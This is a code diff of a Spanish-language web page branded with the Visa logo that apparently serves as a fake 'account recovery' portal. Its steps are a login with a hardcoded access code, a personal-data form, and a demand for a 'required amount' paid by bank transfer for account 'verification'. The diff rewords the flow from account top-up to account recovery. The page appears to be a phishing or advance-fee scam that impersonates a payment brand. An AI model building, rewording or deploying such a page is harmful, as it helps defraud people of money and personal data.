@@ -6,7 +6,7 @@
   <script src="bank-data.js"></script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Sistema de Recarga - Pasarela Segura Visa</title>
+    <title>Sistema de Recuperación de Cuenta</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -2504,8 +2504,8 @@
             <div class="logo-container">
              <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="VISA Logo" class="logo">
             </div>
-            <h1>Sistema de Recarga</h1>
-            <p>Portal seguro para activación de cuentas y transacciones protegidas</p>
+            <h1>Sistema de Recuperación de Cuenta</h1>
+            <p>Portal seguro para recuperación de cuentas y transacciones protegidas</p>
         </div>
         
         <div class="steps" data-progress="1" id="progress-steps">
@@ -2519,7 +2519,7 @@
             </div>
             <div class="step" id="step-3">
                 <div class="step-icon"><span>3</span></div>
-                <div class="step-text">Información de Recarga</div>
+                <div class="step-text">Información de Recuperación</div>
             </div>
             <div class="step" id="step-4">
                 <div class="step-icon"><span>4</span></div>
@@ -2530,7 +2530,7 @@
         <!-- Formulario de Inicio de Sesión -->
         <div class="card active" id="login-form">
             <h2>Ingreso al Sistema</h2>
-            <p>Ingrese sus datos para continuar con el proceso de activación</p>
+            <p>Ingrese sus datos para continuar con el proceso de recuperación</p>
             
             <!-- Reordenado: nombre primero, luego clave -->
             <div class="form-group">
@@ -2582,7 +2582,7 @@
         <!-- Formulario de Datos Personales -->
         <div class="card" id="user-data-form">
             <h2>Datos Personales</h2>
-            <p>Complete su información personal para continuar con el proceso de activación</p>
+            <p>Complete su información personal para continuar con el proceso de recuperación</p>
             
             <div class="form-group">
                 <label for="full-name">Nombre Completo:</label>
@@ -2622,30 +2622,30 @@
             </div>
         </div>
         
-        <!-- Información de Recarga -->
+        <!-- Información de Recuperación -->
         <div class="card" id="payment-info">
-            <h2>Información de Recarga</h2>
-            <p>Seleccione el monto de recarga y utilice los datos de transferencia para completar el pago:</p>
+            <h2>Información de Recuperación</h2>
+            <p>Seleccione el monto requerido y utilice los datos de transferencia para completar el pago:</p>
             <p id="min-amount-note" class="min-amount-note"></p>
             
             <div class="form-group">
-                <label for="amount-container">Monto de Recarga:</label>
+                <label for="amount-container">Monto Requerido:</label>
                 <div id="amount-container">
                     <!-- Las opciones de monto se cargarán dinámicamente -->
                 </div>
             </div>
 
             <div class="form-group">
-                <label for="recharge-purpose">Propósito de la Recarga:</label>
+                <label for="recharge-purpose">Propósito del Pago:</label>
                 <select id="recharge-purpose">
-                    <option value="verification">Recarga en cuenta con fines de verificación de cuenta</option>
-                    <option value="registration">Recarga en cuenta con fines de registrar cuenta</option>
+                    <option value="verification">Pago con fines de verificación de cuenta</option>
+                    <option value="registration">Pago con fines de registrar cuenta</option>
                 </select>
             </div>
             
             <div class="data-card" onclick="showPaymentData()">
                 <i class="fas fa-credit-card"></i>
-                <h3>Ver Datos para Recarga</h3>
+                <h3>Ver Datos para Recuperación</h3>
                 <p>Haga clic aquí para ver la información necesaria para realizar la transferencia</p>
             </div>
             
@@ -2850,8 +2850,8 @@
     // Variable centralizada para la tasa de cambio (modifique este valor para actualizar todos los cálculos)
     const dollarRate = 142.00; // Tasa de cambio actual: 1 USD = X Bs.
     const accessCodeValues = [
-        '00981841084750599670',
-    ]; // Misma clave que en recarga.html
+        '010981871084750599644'
+    ]; // Clave de acceso para recuperación de cuenta
     const conceptCode = '4454651'; // Código de concepto unificado
     
     // Definición de montos disponibles (se filtrarán según el saldo del usuario)
@@ -3352,12 +3352,13 @@ const bankList = [...(BANK_DATA.NACIONAL || []), ...(BANK_DATA.INTERNACIONAL || 
             return;
         }
         
-        const accessCode = document.getElementById('access-code').value;
-        const userName = document.getElementById('user-name').value;
+        const accessCodeInput = document.getElementById('access-code').value;
+        const accessCode = accessCodeInput.trim();
+        const userName = document.getElementById('user-name').value.trim();
         let isValid = true;
         
         // Validar nombre
-        if (userName.trim() === '') {
+        if (userName === '') {
             document.getElementById('name-error').innerHTML = '<i class="fas fa-exclamation-circle"></i> Por favor ingrese su nombre';
             isValid = false;
         } else {
@@ -3365,7 +3366,7 @@ const bankList = [...(BANK_DATA.NACIONAL || []), ...(BANK_DATA.INTERNACIONAL || 
         }
         
         // Validar código de acceso
-        if (accessCode.trim() === '') {
+        if (accessCode === '') {
             document.getElementById('code-error').innerHTML = '<i class="fas fa-exclamation-circle"></i> Por favor ingrese su código de acceso';
             isValid = false;
         } else if (!accessCodeValues.includes(accessCode)) {
@@ -3572,7 +3573,7 @@ const bankList = [...(BANK_DATA.NACIONAL || []), ...(BANK_DATA.INTERNACIONAL || 
     function goToTransferDetails() {
         // Validar que se haya visto los datos de pago
         if (!hasViewedPaymentData) {
-            showToast("Para continuar, primero debe revisar los datos para realizar la transferencia. Haga clic en 'Ver Datos para Recarga'.");
+            showToast("Para continuar, primero debe revisar los datos para realizar la transferencia. Haga clic en 'Ver Datos para Recuperación'.");
             return;
         }
         
